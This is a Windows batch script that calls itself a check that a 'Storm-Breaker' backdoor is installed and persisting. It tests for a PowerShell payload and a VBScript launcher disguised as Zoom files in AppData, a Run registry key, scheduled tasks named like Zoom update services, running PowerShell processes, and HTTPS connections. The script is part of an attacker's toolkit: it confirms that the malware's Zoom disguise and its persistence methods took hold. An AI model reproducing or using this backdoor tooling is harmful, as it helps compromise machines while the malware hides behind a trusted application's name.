@echo off
:: Test Script - Verify Backdoor Installation and Persistence
:: This script checks if the backdoor is properly installed

echo ============================================
echo Storm-Breaker Backdoor Installation Check
echo ============================================
echo.

:: Check for PowerShell script
echo [1] Checking for PowerShell script...
if exist "%APPDATA%\Microsoft\Windows\ZoomService.ps1" (
    echo     [✓] Found: ZoomService.ps1
) else (
    echo     [✗] Not found: ZoomService.ps1
)
echo.

:: Check for VBScript launcher
echo [2] Checking for VBScript launcher...
if exist "%APPDATA%\Microsoft\Windows\ZoomUpdate.vbs" (
    echo     [✓] Found: ZoomUpdate.vbs
) else (
    echo     [✗] Not found: ZoomUpdate.vbs
)
echo.

:: Check registry startup entry
echo [3] Checking registry startup entry...
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ZoomUpdate >nul 2>&1
if %errorlevel% equ 0 (
    echo     [✓] Found: Registry startup entry
    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ZoomUpdate
) else (
    echo     [✗] Not found: Registry startup entry
)
echo.

:: Check scheduled tasks
echo [4] Checking scheduled tasks...
schtasks /query /tn "ZoomUpdateService" >nul 2>&1
if %errorlevel% equ 0 (
    echo     [✓] Found: ZoomUpdateService task
) else (
    echo     [✗] Not found: ZoomUpdateService task
)

schtasks /query /tn "ZoomUpdateCheck" >nul 2>&1
if %errorlevel% equ 0 (
    echo     [✓] Found: ZoomUpdateCheck task
) else (
    echo     [✗] Not found: ZoomUpdateCheck task
)
echo.

:: Check if PowerShell process is running
echo [5] Checking for running PowerShell processes...
tasklist /FI "IMAGENAME eq powershell.exe" /FO CSV | find /I "powershell.exe" >nul
if %errorlevel% equ 0 (
    echo     [✓] PowerShell process is running
    echo.
    echo     Active PowerShell processes:
    tasklist /FI "IMAGENAME eq powershell.exe" /FO TABLE
) else (
    echo     [✗] No PowerShell process found
)
echo.

:: Network connection check
echo [6] Checking network connections...
netstat -ano | find "ESTABLISHED" | find "443" >nul
if %errorlevel% equ 0 (
    echo     [✓] HTTPS connections detected
) else (
    echo     [!] No HTTPS connections found (may be normal)
)
echo.

echo ============================================
echo Installation Check Complete
echo ============================================
echo.
echo Press any key to exit...
pause >nul
